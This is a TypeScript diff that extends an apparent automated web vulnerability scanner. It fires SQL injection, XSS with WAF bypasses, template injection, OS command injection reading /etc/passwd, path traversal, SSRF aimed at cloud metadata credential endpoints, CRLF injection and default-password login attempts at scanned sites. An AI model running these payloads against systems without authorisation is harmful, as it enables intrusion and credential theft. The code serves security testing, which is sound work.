+    const trueUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent("' AND 1=1--")}`) : `${url}?q=${encodeURIComponent("' AND 1=1--")}`;
+    const falseUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent("' AND 1=2--")}`) : `${url}?q=${encodeURIComponent("' AND 1=2--")}`;
+    const [rTrue, rFalse] = await Promise.all([probeFetch(trueUrl), probeFetch(falseUrl)]);
+    if (rTrue && rFalse && rTrue.status === rFalse.status) {
+      const lenDiff = Math.abs(rTrue.body.length - rFalse.body.length);
+      if (lenDiff > 50 && lenDiff < rTrue.body.length * 0.8) {
+        vulnResults.push({ type: "SQL Injection (Boolean-based Blind)", severity: "critical", url: trueUrl, payload: "' AND 1=1-- vs ' AND 1=2--", evidence: `فرق الاستجابة: ${lenDiff} bytes (True: ${rTrue.body.length}, False: ${rFalse.body.length})`, exploitable: true });
+      }
+    }
+  });
+
+  // Time-based Blind SQLi
+  const timeSqliProbes = sqliTestUrls.slice(0, 3).map(async (url) => {
+    const start = Date.now();
+    const sleepUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent("1' AND SLEEP(4)--")}`) : `${url}?q=${encodeURIComponent("1' AND SLEEP(4)--")}`;
+    const r = await probeFetch(sleepUrl, { timeoutMs: 12_000 });
+    const elapsed = Date.now() - start;
+    if (r && elapsed > 3500) {
+      vulnResults.push({ type: "SQL Injection (Time-based Blind)", severity: "critical", url: sleepUrl, payload: "1' AND SLEEP(4)--", evidence: `زمن الاستجابة: ${elapsed}ms (> 3500ms يدل على SLEEP ناجح)`, exploitable: true });
+    }
+  });
+
+  // ═══ 2. ADVANCED XSS — Reflected + WAF Bypass + Polyglot + Context-aware ═══
   const xssPayloads = [
+    // Basic
     { payload: '<script>alert(1)</script>', indicator: /<script>alert\(1\)<\/script>/i },
     { payload: '"><img src=x onerror=alert(1)>', indicator: /onerror=alert/i },
     { payload: "'-alert(1)-'", indicator: /'-alert\(1\)-'/i },
+    // WAF Bypass payloads
+    { payload: '<svg onload=alert(1)>', indicator: /<svg onload=alert/i },
+    { payload: '<svg/onload=alert(1)>', indicator: /<svg\/onload=alert/i },
+    { payload: '<img src=x onerror=alert`1`>', indicator: /onerror=alert/i },
+    { payload: '<details open ontoggle=alert(1)>', indicator: /ontoggle=alert/i },
+    { payload: '<marquee onstart=alert(1)>', indicator: /onstart=alert/i },
+    { payload: '<body onload=alert(1)>', indicator: /onload=alert/i },
+    { payload: '"><svg><script>alert(1)</script>', indicator: /<script>alert\(1\)/i },
+    // Encoding bypass
+    { payload: '%3Cscript%3Ealert(1)%3C/script%3E', indicator: /<script>alert\(1\)<\/script>/i },
+    { payload: '&#60;script&#62;alert(1)&#60;/script&#62;', indicator: /<script>alert\(1\)/i },
+    // Event handler bypass
+    { payload: '" autofocus onfocus=alert(1) x="', indicator: /onfocus=alert/i },
+    { payload: "javascript:alert(1)//", indicator: /javascript:alert/i },
+    // Polyglot XSS
+    { payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", indicator: /javascript:|onclick=alert/i },
+    // SSTI detection via XSS context
     { payload: "{{7*7}}", indicator: /49/ },
+    { payload: "${7*7}", indicator: /49/ },
+    { payload: "#{7*7}", indicator: /49/ },
   ];
-  const xssTestUrls = [...sqliTestUrls.slice(0, 3), ...allEndpoints.filter(u => u.includes(domain) && /\?/.test(u)).slice(0, 2)];
+  const xssTestUrls = [...new Set([...sqliTestUrls.slice(0, 5), ...allEndpoints.filter(u => u.includes(domain) && /\?/.test(u)).slice(0, 5)])];
 
-  const xssProbes = xssTestUrls.slice(0, 4).flatMap(url => xssPayloads.slice(0, 2).map(async ({ payload, indicator }) => {
-    try {
+  // URL-based XSS probes
+  const xssProbes = xssTestUrls.slice(0, 8).flatMap(url => xssPayloads.slice(0, 10).map(async ({ payload, indicator }) => {
+    const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?q=${encodeURIComponent(payload)}`;
+    const r = await probeFetch(testUrl);
+    if (r && indicator.test(r.body)) {
+      const isReflected = r.body.includes(payload);
+      if (isReflected || indicator.test(r.body)) {
+        const vulnType = /\{\{|\$\{|#\{/.test(payload) ? "Server-Side Template Injection (SSTI)" : "Reflected XSS";
+        vulnResults.push({ type: vulnType, severity: vulnType.includes("SSTI") ? "critical" : "high", url: testUrl, payload, evidence: isReflected ? "الحمولة انعكست بدون تنقية في الاستجابة" : `Pattern matched: ${r.body.match(indicator)?.[0]}`, exploitable: true });
+      }
+    }
+  }));
+
+  // Form-based XSS probes — test every form input
+  const formXssResults: FormTestResult[] = [];
+  const formXssProbes = webData.allForms.slice(0, 15).flatMap(form =>
+    form.inputs.filter(inp => inp.type !== "hidden" && inp.type !== "submit" && inp.type !== "checkbox" && inp.type !== "radio" && inp.type !== "file")
+      .slice(0, 5).flatMap(input =>
+        xssPayloads.slice(0, 6).map(async ({ payload, indicator }) => {
+          const formData: Record<string, string> = {};
+          for (const inp of form.inputs) {
+            formData[inp.name] = inp.name === input.name ? payload : (inp.value || "test");
+          }
+          if (form.method === "GET") {
+            const qs = Object.entries(formData).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join("&");
+            const testUrl = `${form.action}?${qs}`;
+            const r = await probeFetch(testUrl);
+            if (r && indicator.test(r.body) && r.body.includes(payload)) {
+              formXssResults.push({ form, field: input.name, vulnType: "Reflected XSS", payload, evidence: "Payload reflected" });
+              vulnResults.push({ type: "Reflected XSS [Form]", severity: "high", url: testUrl, payload, evidence: `حقل: ${input.name} — الحمولة انعكست بدون تنقية`, exploitable: true, param: input.name });
+            }
+          } else {
+            const r = await probeFetch(form.action, {
+              method: "POST",
+              headers: { "Content-Type": "application/x-www-form-urlencoded" },
+              body: Object.entries(formData).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join("&"),
+            });
+            if (r && indicator.test(r.body) && r.body.includes(payload)) {
+              formXssResults.push({ form, field: input.name, vulnType: "Reflected XSS", payload, evidence: "Payload reflected" });
+              vulnResults.push({ type: "Reflected XSS [Form POST]", severity: "high", url: form.action, payload, evidence: `حقل: ${input.name} — الحمولة انعكست بدون تنقية`, exploitable: true, method: "POST", param: input.name });
+            }
+          }
+        })
+      )
+  );
+
+  // ═══ 3. SERVER-SIDE TEMPLATE INJECTION (SSTI) ═══
+  const sstiPayloads = [
+    { payload: "{{7*7}}", expected: "49", engine: "Jinja2/Twig/Django" },
+    { payload: "${7*7}", expected: "49", engine: "FreeMarker/Mako/EL" },
+    { payload: "#{7*7}", expected: "49", engine: "Ruby ERB/Thymeleaf" },
+    { payload: "<%= 7*7 %>", expected: "49", engine: "ERB/EJS" },
+    { payload: "{{7*'7'}}", expected: "7777777", engine: "Jinja2 (confirmed)" },
+    { payload: "${T(java.lang.Runtime).getRuntime()}", expected: "Runtime", engine: "Spring EL (critical)" },
+    { payload: "{{config}}", expected: "config|SECRET|DEBUG|ENV", engine: "Jinja2 config leak" },
+    { payload: "{{self.__class__}}", expected: "class", engine: "Jinja2 class access" },
+    { payload: "{php}echo 7*7;{/php}", expected: "49", engine: "Smarty PHP" },
+    { payload: "{{constructor.constructor('return 1')()}}", expected: "1", engine: "AngularJS sandbox escape" },
+  ];
+  const sstiTargets = [...xssTestUrls.slice(0, 5), ...webData.allForms.map(f => f.action).slice(0, 3)];
+  const sstiProbes = [...new Set(sstiTargets)].slice(0, 6).flatMap(url =>
+    sstiPayloads.map(async ({ payload, expected, engine }) => {
       const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?q=${encodeURIComponent(payload)}`;
-      const ctrl = new AbortController();
-      const t = setTimeout(() => ctrl.abort(), 8_000);
-      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "follow" });
-      clearTimeout(t);
-      const body = await r.text();
-      if (indicator.test(body) && body.includes(payload)) {
-        vulnResults.push({ type: "Reflected XSS", severity: "high", url: testUrl, payload, evidence: "Payload reflected in response without sanitization", exploitable: true });
+      const r = await probeFetch(testUrl);
+      if (r) {
+        const expectedRegex = new RegExp(expected, "i");
+        if (expectedRegex.test(r.body) && !r.body.includes(payload)) {
+          vulnResults.push({ type: `SSTI (${engine})`, severity: "critical", url: testUrl, payload, evidence: `القالب نفّذ العملية الحسابية — المحرك: ${engine}`, exploitable: true });
+        }
       }
-    } catch {}
+    })
+  );
+
+  // ═══ 4. COMMAND INJECTION ═══
+  const cmdInjectionPayloads = [
+    { payload: "; cat /etc/passwd", indicator: /root:x:|root:.*:0:0/i },
+    { payload: "| cat /etc/passwd", indicator: /root:x:|root:.*:0:0/i },
+    { payload: "` cat /etc/passwd`", indicator: /root:x:|root:.*:0:0/i },
+    { payload: "$(cat /etc/passwd)", indicator: /root:x:|root:.*:0:0/i },
+    { payload: "; ls -la /", indicator: /bin|boot|dev|etc|home|lib|tmp|usr|var/i },
+    { payload: "| id", indicator: /uid=\d+/i },
+    { payload: "; whoami", indicator: /www-data|root|nginx|apache|node|ubuntu/i },
+    { payload: "& ping -c 1 127.0.0.1 &", indicator: /PING|ttl=|bytes from/i },
+    { payload: "| type C:\\Windows\\System32\\drivers\\etc\\hosts", indicator: /localhost|127\.0\.0\.1/i },
+    // DNS-based (blind)
+    { payload: "; nslookup cipher7test.com", indicator: /nslookup|server|address|non-authoritative/i },
+  ];
+  const cmdTargets = apiEndpoints.filter(u => /\/exec|\/run|\/cmd|\/ping|\/lookup|\/resolve|\/convert|\/process|\/upload|\/download/i.test(u)).slice(0, 5);
+  const cmdFormTargets = webData.allForms.filter(f => f.inputs.some(i => /host|ip|cmd|command|exec|domain|ping|url|addr|target|server/i.test(i.name))).slice(0, 5);
+
+  const cmdProbes = cmdTargets.flatMap(url =>
+    cmdInjectionPayloads.slice(0, 5).map(async ({ payload, indicator }) => {
+      const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?cmd=${encodeURIComponent(payload)}`;
+      const r = await probeFetch(testUrl);
+      if (r && indicator.test(r.body)) {
+        vulnResults.push({ type: "Command Injection (OS)", severity: "critical", url: testUrl, payload, evidence: r.body.match(indicator)?.[0] || "OS command executed", exploitable: true });
+      }
+    })
+  );
+
+  // Form-based command injection
+  const formCmdProbes = cmdFormTargets.flatMap(form =>
+    form.inputs.filter(i => /host|ip|cmd|command|exec|domain|ping|url|addr|target|server/i.test(i.name)).flatMap(input =>
+      cmdInjectionPayloads.slice(0, 4).map(async ({ payload, indicator }) => {
+        const formData: Record<string, string> = {};
+        for (const inp of form.inputs) {
+          formData[inp.name] = inp.name === input.name ? `127.0.0.1${payload}` : (inp.value || "test");
+        }
+        const r = await probeFetch(form.action, {
+          method: form.method === "GET" ? "GET" : "POST",
+          headers: form.method === "POST" ? { "Content-Type": "application/x-www-form-urlencoded" } : {},
+          body: form.method === "POST" ? Object.entries(formData).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join("&") : undefined,
+        });
+        if (r && indicator.test(r.body)) {
+          vulnResults.push({ type: "Command Injection [Form]", severity: "critical", url: form.action, payload: `${input.name}=127.0.0.1${payload}`, evidence: `حقل: ${input.name} — ${r.body.match(indicator)?.[0] || "Command output detected"}`, exploitable: true, method: form.method, param: input.name });
+        }
+      })
+    )
+  );
+
+  // ═══ 5. OPEN REDIRECT ═══
+  const redirectParams = ["url", "redirect", "next", "return", "returnTo", "goto", "continue", "dest", "destination", "redir", "redirect_uri", "return_url", "callback", "forward", "target", "out", "view", "ref", "site", "to"];
+  const redirectTestPages = [...new Set([`${baseUrl}/login`, `${baseUrl}/auth`, `${baseUrl}/signin`, `${baseUrl}/logout`, `${baseUrl}/redirect`, ...webData.crawledPages.filter(p => /login|auth|signin|redirect|logout/i.test(p.url)).map(p => p.url)])].slice(0, 5);
+  const redirectProbes = redirectTestPages.flatMap(page =>
+    redirectParams.slice(0, 10).map(async (param) => {
+      const testUrl = `${page}${page.includes("?") ? "&" : "?"}${param}=https://evil-attacker.com`;
+      const r = await probeFetch(testUrl, { redirect: "manual" } as any);
+      if (r) {
+        const location = r.headers["location"] || "";
+        if (location.includes("evil-attacker.com")) {
+          vulnResults.push({ type: "Open Redirect", severity: "medium", url: testUrl, payload: `${param}=https://evil-attacker.com`, evidence: `إعادة توجيه إلى: ${location}`, exploitable: true });
+        }
+      }
+    })
+  );
+
+  // ═══ 6. DIRECTORY TRAVERSAL / LFI ═══
+  const traversalPayloads = [
+    "../../../etc/passwd", "....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
+    "/etc/passwd", "....//....//etc/shadow", "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "..%00/../../etc/passwd", "....\/....\/....\/etc/passwd",
+  ];
+  const traversalTargets = [
+    ...apiEndpoints.filter(u => /\/file|\/download|\/read|\/load|\/include|\/template|\/path|\/img|\/image|\/doc|\/page|\/view|\/display|\/open/i.test(u)).slice(0, 5),
+    ...webData.allForms.filter(f => f.inputs.some(i => /file|path|page|doc|template|dir|folder|name|load|include|read/i.test(i.name))).map(f => f.action).slice(0, 3),
+  ];
+  const traversalProbes = [...new Set(traversalTargets)].flatMap(url => traversalPayloads.slice(0, 5).map(async (payload) => {
+    const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?file=${encodeURIComponent(payload)}`;
+    const r = await probeFetch(testUrl);
+    if (r && /root:x:|root:.*:0:0|localhost|127\.0\.0\.1|\[boot loader\]|\/bin\/bash|shadow:.*:\d/i.test(r.body)) {
+      vulnResults.push({ type: "Directory Traversal / LFI", severity: "critical", url: testUrl, payload, evidence: r.body.slice(0, 800), exploitable: true });
+    }
   }));
 
-  // --- Open Redirect Probes ---
-  const redirectParams = ["url", "redirect", "next", "return", "returnTo", "goto", "continue", "dest", "destination", "redir", "redirect_uri", "return_url"];
-  const redirectProbes = redirectParams.slice(0, 5).map(async (param) => {
-    try {
-      const testUrl = `${baseUrl}/login?${param}=https://evil-attacker.com`;
-      const ctrl = new AbortController();
-      const t = setTimeout(() => ctrl.abort(), 8_000);
-      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "manual" });
-      clearTimeout(t);
-      const location = r.headers.get("location") || "";
-      if (location.includes("evil-attacker.com")) {
-        vulnResults.push({ type: "Open Redirect", severity: "medium", url: testUrl, payload: `${param}=https://evil-attacker.com`, evidence: `Redirects to: ${location}`, exploitable: true });
-      }
-    } catch {}
-  });
-
-  // --- Directory Traversal Probes ---
-  const traversalPayloads = ["../../../etc/passwd", "....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"];
-  const traversalTargets = apiEndpoints.filter(u => /\/file|\/download|\/read|\/load|\/include|\/template|\/path|\/img|\/image/i.test(u)).slice(0, 3);
-  const traversalProbes = traversalTargets.flatMap(url => traversalPayloads.slice(0, 2).map(async (payload) => {
-    try {
-      const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?file=${encodeURIComponent(payload)}`;
-      const ctrl = new AbortController();
-      const t = setTimeout(() => ctrl.abort(), 8_000);
-      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "follow" });
-      clearTimeout(t);
-      const body = await r.text();
-      if (/root:x:|root:.*:0:0|localhost|127\.0\.0\.1|\[boot loader\]/i.test(body)) {
-        vulnResults.push({ type: "Directory Traversal / LFI", severity: "critical", url: testUrl, payload, evidence: body.slice(0, 200), exploitable: true });
-      }
-    } catch {}
-  }));
-
-  // --- SSRF Probes ---
-  const ssrfTargets = apiEndpoints.filter(u => /\/fetch|\/proxy|\/url|\/link|\/callback|\/webhook|\/preview|\/render/i.test(u)).slice(0, 3);
-  const ssrfProbes = ssrfTargets.map(async (url) => {
-    try {
-      const payload = "http://169.254.169.254/latest/meta-data/";
+  // ═══ 7. SSRF — Server-Side Request Forgery ═══
+  const ssrfTargets = [
+    ...apiEndpoints.filter(u => /\/fetch|\/proxy|\/url|\/link|\/callback|\/webhook|\/preview|\/render|\/curl|\/get|\/load|\/request|\/navigate/i.test(u)).slice(0, 5),
+    ...webData.allForms.filter(f => f.inputs.some(i => /url|link|src|href|callback|webhook|fetch|proxy|redirect|target|site|endpoint/i.test(i.name))).map(f => f.action).slice(0, 3),
+  ];
+  const ssrfPayloads = [
+    { payload: "http://169.254.169.254/latest/meta-data/", indicator: /ami-id|instance-id|iam|security-credentials|hostname|public-ipv4/i, desc: "AWS Metadata" },
+    { payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", indicator: /AccessKeyId|SecretAccessKey|Token|Expiration/i, desc: "AWS IAM Credentials" },
+    { payload: "http://metadata.google.internal/computeMetadata/v1/", indicator: /project|attributes|hostname|instance/i, desc: "GCP Metadata" },
+    { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", indicator: /vmId|name|location|resourceGroup/i, desc: "Azure IMDS" },
+    { payload: "http://127.0.0.1:6379/", indicator: /redis|ERR|DENIED|wrong number of arguments/i, desc: "Internal Redis" },
+    { payload: "http://127.0.0.1:3306/", indicator: /mysql|MariaDB|native_password/i, desc: "Internal MySQL" },
+    { payload: "http://127.0.0.1:27017/", indicator: /mongodb|ismaster|maxBsonObjectSize/i, desc: "Internal MongoDB" },
+    { payload: "http://127.0.0.1:9200/", indicator: /elasticsearch|lucene|cluster_name|cluster_uuid/i, desc: "Internal Elasticsearch" },
+    { payload: "http://127.0.0.1:8080/", indicator: /tomcat|jenkins|manager|dashboard/i, desc: "Internal Service (8080)" },
+  ];
+  const ssrfProbes = [...new Set(ssrfTargets)].flatMap(url =>
+    ssrfPayloads.map(async ({ payload, indicator, desc }) => {
       const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?url=${encodeURIComponent(payload)}`;
-      const ctrl = new AbortController();
-      const t = setTimeout(() => ctrl.abort(), 8_000);
-      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "follow" });
-      clearTimeout(t);
-      const body = await r.text();
-      if (/ami-id|instance-id|iam|security-credentials/i.test(body)) {
-        vulnResults.push({ type: "SSRF", severity: "critical", url: testUrl, payload, evidence: "AWS metadata endpoint accessible", exploitable: true });
+      const r = await probeFetch(testUrl);
+      if (r && indicator.test(r.body)) {
+        vulnResults.push({ type: `SSRF (${desc})`, severity: "critical", url: testUrl, payload, evidence: `${desc} — ${r.body.match(indicator)?.[0]}`, exploitable: true });
       }
-    } catch {}
-  });
+    })
+  );
 
-  // --- Subdomain Enumeration ---
-  const commonSubdomains = ["www", "api", "admin", "dev", "staging", "test", "mail", "ftp", "cpanel", "dashboard", "app", "portal", "cdn", "assets", "static", "db", "backend", "internal", "vpn", "git", "jenkins", "ci", "monitor", "grafana", "kibana"];
+  // ═══ 8. SUBDOMAIN ENUMERATION ═══
+  const commonSubdomains = [
+    "www", "api", "admin", "dev", "staging", "test", "mail", "ftp", "cpanel", "dashboard",
+    "app", "portal", "cdn", "assets", "static", "db", "backend", "internal", "vpn", "git",
+    "jenkins", "ci", "monitor", "grafana", "kibana", "prometheus", "sentry", "jira", "confluence",
+    "gitlab", "bitbucket", "docker", "k8s", "kubernetes", "redis", "elastic", "rabbitmq",
+    "beta", "alpha", "sandbox", "preview", "demo", "stg", "uat", "qa", "pre", "prod",
+    "ns1", "ns2", "mx", "smtp", "pop", "imap", "webmail", "autodiscover",
+    "shop", "store", "pay", "billing", "support", "help", "docs", "wiki",
+  ];
   const baseDomain = domain.replace(/^www\./, "");
   const discoveredSubdomains: { subdomain: string; status: number; server: string }[] = [];
   const subdomainProbes = commonSubdomains.map(async (sub) => {
@@ -7609,29 +8180,169 @@ if __name__ == "__main__":
     } catch {}
   });
 
-  // --- Header Injection / CRLF ---
-  const crlfProbes = [(async () => {
-    try {
-      const testUrl = `${baseUrl}/%0d%0aSet-Cookie:%20hacked=true`;
-      const ctrl = new AbortController();
-      const t = setTimeout(() => ctrl.abort(), 8_000);
-      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "manual" });
-      clearTimeout(t);
-      const setCookie = r.headers.get("set-cookie") || "";
-      if (setCookie.includes("hacked")) {
-        vulnResults.push({ type: "CRLF Injection", severity: "high", url: testUrl, payload: "%0d%0aSet-Cookie: hacked=true", evidence: "Injected header reflected in response", exploitable: true });
+  // ═══ 9. CRLF INJECTION ═══
+  const crlfPayloads = [
+    "%0d%0aSet-Cookie:%20hacked=true",
+    "%0d%0aX-Injected:%20true",
+    "%0d%0a%0d%0a<script>alert(1)</script>",
+    "%0aHost:%20evil.com",
+    "\\r\\nSet-Cookie:\\s+hacked=true",
+  ];
+  const crlfProbes = crlfPayloads.slice(0, 3).map(async (payload) => {
+    const testUrl = `${baseUrl}/${payload}`;
+    const r = await probeFetch(testUrl, { redirect: "manual" } as any);
+    if (r) {
+      const setCookie = r.headers["set-cookie"] || "";
+      const xInjected = r.headers["x-injected"] || "";
+      if (setCookie.includes("hacked") || xInjected.includes("true")) {
+        vulnResults.push({ type: "CRLF Injection", severity: "high", url: testUrl, payload, evidence: "ترويسة HTTP مُحقنة في الاستجابة", exploitable: true });
       }
-    } catch {}
-  })()];
+    }
+  });
 
-  // --- Run all probes in parallel ---
-  await Promise.allSettled([...sqliProbes, ...xssProbes, ...redirectProbes, ...traversalProbes, ...ssrfProbes, ...subdomainProbes, ...crlfProbes]);
+  // ═══ 10. HTTP METHOD TESTING ═══
+  interface HttpMethodResult { url: string; method: string; status: number; allowed: boolean; sensitive: boolean; }
+  const httpMethodResults: HttpMethodResult[] = [];
+  const dangerousMethods = ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT"];
+  const methodTestUrls = [...apiEndpoints.slice(0, 5), baseUrl, `${baseUrl}/api`].slice(0, 6);
 
-  // Update risk score with deep scan findings
+  const httpMethodProbes = methodTestUrls.flatMap(url =>
+    dangerousMethods.map(async (method) => {
+      const r = await probeFetch(url, { method } as any);
+      if (r && r.status < 405 && r.status !== 0) {
+        const isSensitive = method === "PUT" || method === "DELETE" || method === "TRACE";
+        httpMethodResults.push({ url, method, status: r.status, allowed: true, sensitive: isSensitive });
+        if (isSensitive) {
+          vulnResults.push({ type: `HTTP Method Allowed: ${method}`, severity: method === "TRACE" ? "medium" : "high", url, payload: `${method} request`, evidence: `HTTP ${r.status} — الطريقة ${method} مسموحة`, exploitable: method !== "TRACE" });
+        }
+      }
+    })
+  );
+
+  // ═══ 11. ERROR-BASED INFORMATION DISCLOSURE ═══
+  interface InfoDisclosure { url: string; type: string; detail: string; severity: "high" | "medium" | "low"; }
+  const infoDisclosures: InfoDisclosure[] = [];
+  const errorTriggers = [
+    `${baseUrl}/api/nonexistent-endpoint-12345`,
+    `${baseUrl}/api/user/0`,
+    `${baseUrl}/api/user/-1`,
+    `${baseUrl}/api/user/'`,
+    `${baseUrl}/undefined`,
+    `${baseUrl}/null`,
+    `${baseUrl}/api/v1/../../admin`,
+  ];
+  const errorProbes = errorTriggers.map(async (url) => {
+    const r = await probeFetch(url);
+    if (r) {
+      if (/stack trace|traceback|at\s+\w+\.\w+\s*\(|File\s+"[^"]+",\s+line\s+\d+|Exception in thread|System\.NullReferenceException/i.test(r.body)) {
+        infoDisclosures.push({ url, type: "Stack Trace Exposure", detail: r.body.slice(0, 1500), severity: "high" });
+        vulnResults.push({ type: "Information Disclosure (Stack Trace)", severity: "high", url, payload: "Error trigger", evidence: "تسريب Stack Trace — يكشف بنية الكود وملفات المصدر", exploitable: false });
+      }
+      if (/debug\s*=\s*true|DJANGO_SETTINGS_MODULE|settings\.py|node_modules|vendor\/laravel/i.test(r.body)) {
+        infoDisclosures.push({ url, type: "Debug Mode Active", detail: "وضع التصحيح نشط — يكشف معلومات حساسة", severity: "high" });
+        vulnResults.push({ type: "Debug Mode Active", severity: "high", url, payload: "Error trigger", evidence: "وضع التصحيح (Debug) نشط — يسرب معلومات الخادم", exploitable: false });
+      }
+      if (/mysql|postgresql|sqlite|SQLSTATE|MongoError|MongoServerError|ECONNREFUSED/i.test(r.body)) {
+        infoDisclosures.push({ url, type: "Database Error Exposure", detail: r.body.match(/mysql|postgresql|sqlite|SQLSTATE|MongoError|ECONNREFUSED/i)?.[0] || "", severity: "high" });
+        vulnResults.push({ type: "Database Error Disclosure", severity: "high", url, payload: "Error trigger", evidence: `تسريب خطأ قاعدة البيانات: ${r.body.match(/mysql|postgresql|sqlite|SQLSTATE|MongoError|MongoServerError|ECONNREFUSED/i)?.[0]}`, exploitable: false });
+      }
+      if (/version|powered by|php\/|apache\/|nginx\/|node\/|express\/|django\/|laravel\/|ruby\/|python\//i.test(r.body) && r.status >= 400) {
+        const versionMatch = r.body.match(/(php|apache|nginx|node|express|django|laravel|ruby|python)\/[\d.]+/i);
+        if (versionMatch) {
+          infoDisclosures.push({ url, type: "Server Version Disclosure", detail: versionMatch[0], severity: "medium" });
+        }
+      }
+    }
+  });
+
+  // ═══ 12. AUTHENTICATION WEAKNESS DETECTION ═══
+  interface AuthWeakness { type: string; detail: string; severity: "critical" | "high" | "medium"; url: string; }
+  const authWeaknesses: AuthWeakness[] = [];
+  const defaultCreds = [
+    { user: "admin", pass: "admin" }, { user: "admin", pass: "password" }, { user: "admin", pass: "123456" },
+    { user: "admin", pass: "admin123" }, { user: "root", pass: "root" }, { user: "root", pass: "toor" },
+    { user: "test", pass: "test" }, { user: "user", pass: "user" }, { user: "admin", pass: "1234" },
+    { user: "administrator", pass: "administrator" }, { user: "guest", pass: "guest" },
+  ];
+  const loginForms = webData.allForms.filter(f =>
+    f.inputs.some(i => /user|email|login|name/i.test(i.name)) &&
+    f.inputs.some(i => /pass|pwd|secret/i.test(i.name))
+  );
+  const loginEndpoints = [
+    ...apiEndpoints.filter(u => /\/login|\/auth|\/signin|\/authenticate|\/session/i.test(u)),
+    ...loginForms.map(f => f.action),
+  ];
+
+  const authProbes = loginForms.slice(0, 3).flatMap(form => {
+    const userField = form.inputs.find(i => /user|email|login|name/i.test(i.name));
+    const passField = form.inputs.find(i => /pass|pwd|secret/i.test(i.name));
+    if (!userField || !passField) return [];
+    return defaultCreds.slice(0, 5).map(async ({ user, pass }) => {
+      const formData: Record<string, string> = {};
+      for (const inp of form.inputs) {
+        if (inp.name === userField.name) formData[inp.name] = user;
+        else if (inp.name === passField.name) formData[inp.name] = pass;
+        else formData[inp.name] = inp.value || "";
+      }
+      const r = await probeFetch(form.action, {
+        method: form.method || "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: Object.entries(formData).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join("&"),
+        redirect: "manual",
+      } as any);
+      if (r) {
+        const isSuccess = r.status === 302 || r.status === 301 || r.status === 200;
+        const hasToken = /token|session|jwt|auth|cookie|set-cookie/i.test(JSON.stringify(r.headers));
+        const noError = !/invalid|incorrect|wrong|failed|error|denied/i.test(r.body.slice(0, 1000));
+        if (isSuccess && (hasToken || noError) && r.body.length > 100) {
+          authWeaknesses.push({ type: "Default Credentials", detail: `${user}:${pass} — استجابة HTTP ${r.status}`, severity: "critical", url: form.action });
+          vulnResults.push({ type: "Default Credentials", severity: "critical", url: form.action, payload: `${user}:${pass}`, evidence: `تم الدخول بأوراق اعتماد افتراضية — ${user}:${pass}`, exploitable: true, method: form.method, param: `${userField.name}/${passField.name}` });
+        }
+      }
+    });
+  });
+
+  // Rate limiting check on login
+  const rateLimitProbes = loginEndpoints.slice(0, 2).map(async (url) => {
+    let successCount = 0;
+    for (let i = 0; i < 8; i++) {
+      const r = await probeFetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: `test_ratelimit_${i}`, password: `wrong_${i}` }),
+      });
+      if (r && r.status !== 429 && r.status !== 403) successCount++;
+    }
+    if (successCount >= 7) {
+      authWeaknesses.push({ type: "No Rate Limiting", detail: `${successCount}/8 طلبات متتالية بدون حظر`, severity: "high", url });
+      vulnResults.push({ type: "No Rate Limiting (Login)", severity: "high", url, payload: "8 login attempts", evidence: `${successCount}/8 طلبات تسجيل دخول فاشلة بدون حظر — يمكن تنفيذ Brute Force`, exploitable: true });
+    }
+  });
+
+  // ═══ RUN ALL PROBES IN PARALLEL ═══
+  await Promise.allSettled([
+    ...sqliProbes, ...formSqliProbes, ...blindSqliProbes, ...timeSqliProbes,
+    ...xssProbes, ...formXssProbes,
+    ...sstiProbes, ...cmdProbes, ...formCmdProbes,
+    ...redirectProbes, ...traversalProbes, ...ssrfProbes,
+    ...subdomainProbes, ...crlfProbes,
+    ...httpMethodProbes, ...errorProbes,
+    ...authProbes, ...rateLimitProbes,
+  ]);
+
+  // ═══ UPDATE RISK SCORE ═══
   riskScore += vulnResults.filter(v => v.severity === "critical").length * 20;
   riskScore += vulnResults.filter(v => v.severity === "high").length * 10;
   riskScore += vulnResults.filter(v => v.severity === "medium").length * 5;
+  riskScore += vulnResults.filter(v => v.severity === "low").length * 2;
   riskScore += discoveredSubdomains.length * 1;
+  riskScore += webData.cookies.filter(c => c.issues.length > 0).length * 3;
+  riskScore += webData.domXssSinks.filter(s => s.severity === "critical").length * 5;
+  riskScore += webData.domXssSinks.filter(s => s.severity === "high").length * 3;
